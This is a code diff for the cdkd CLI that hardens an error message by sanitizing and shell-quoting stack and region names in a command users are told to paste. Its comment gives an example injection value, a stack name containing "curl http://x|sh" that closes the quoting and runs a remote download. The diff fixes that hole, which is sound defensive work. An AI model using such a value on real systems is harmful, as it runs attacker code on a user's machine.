@@ -1,5 +1,6 @@
 import { CdkdError } from '../utils/error-handler.js';
-import { displaySafe } from '../utils/display-safe.js';
+import { UNRENDERABLE, displaySafe } from '../utils/display-safe.js';
+import { shellQuote } from './lock-contention-message.js';
 import type { StackState } from '../types/state.js';
 
 /**
@@ -21,21 +22,36 @@ function hasReadableResources(state: StackState): boolean {
  * The shared explanation, in the terms the reader needs: what is wrong, what
  * to look at, and what NOT to do next.
  *
- * Both arguments go through `displaySafe` because neither is trusted on every
- * path that reaches here — a stack name can arrive from an `Fn::GetStackOutput`
- * argument or an S3 key — and the text embeds them in a command line the
- * message tells the user to RUN. `ConsoleLogger` sanitizes a logger's extra
- * ARGS, never the message string, so the sanitizing has to happen here.
+ * Both identifiers are SANITIZED and THEN SHELL-QUOTED, and the command is
+ * emitted LAST and UNWRAPPED — the shape `lock-contention-message.ts` and
+ * `.claude/rules/layout-state-types.md` require of any suggestion a user is
+ * meant to paste, for two separate reasons.
+ *
+ * Sanitizing alone is not enough. `displaySafe(..., { asciiOnly: true })` is a
+ * printable-ASCII allowlist, so it removes the line- and escape-forgery class
+ * but KEEPS `'`, `;`, `|`, `` ` ``, `$` and spaces — and neither name is
+ * trusted here, since a stack name reaches the cross-stack read path from an
+ * `Fn::GetStackOutput` argument or an S3 key. A name spelled
+ * `a'; curl http://x|sh; echo '` would close the quoting and append its own
+ * command to the line this text tells the user to RUN.
+ *
+ * Wrapping the command in `'...'` is not enough either, and is what makes the
+ * two compose badly: `shellQuote` does its own quoting, so an outer wrapper
+ * produces something unpastable. Hence unwrapped and last.
+ *
+ * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` rather than
+ * nothing — an empty argument makes `--stack-region` swallow the next flag,
+ * turning a remedy into a differently-broken command.
  */
 function malformedStateDetail(stackName: string, region: string): string {
-  const stack = displaySafe(stackName, { asciiOnly: true });
-  const reg = displaySafe(region, { asciiOnly: true });
+  const stack = displaySafe(stackName, { asciiOnly: true }) || UNRENDERABLE;
+  const reg = displaySafe(region, { asciiOnly: true }) || UNRENDERABLE;
   return (
-    `State for '${stack}' (${reg}) has no readable 'resources' map — the record is malformed ` +
-    `or truncated. Inspect it with 'cdkd state show ${stack} --stack-region ${reg} --json'. ` +
-    `Do NOT run 'cdkd deploy' or 'cdkd destroy' against it: both read the same map, and an ` +
-    `unreadable one is indistinguishable from an empty stack, so deploy would re-CREATE every ` +
-    `resource and destroy would delete none of them.`
+    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'resources' map — the ` +
+    `record is malformed or truncated. Do NOT run 'cdkd deploy' or 'cdkd destroy' against it: ` +
+    `both read the same map, and an unreadable one is indistinguishable from an empty stack, ` +
+    `so deploy would re-CREATE every resource and destroy would delete none of them. Inspect ` +
+    `it with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
   );
 }
 
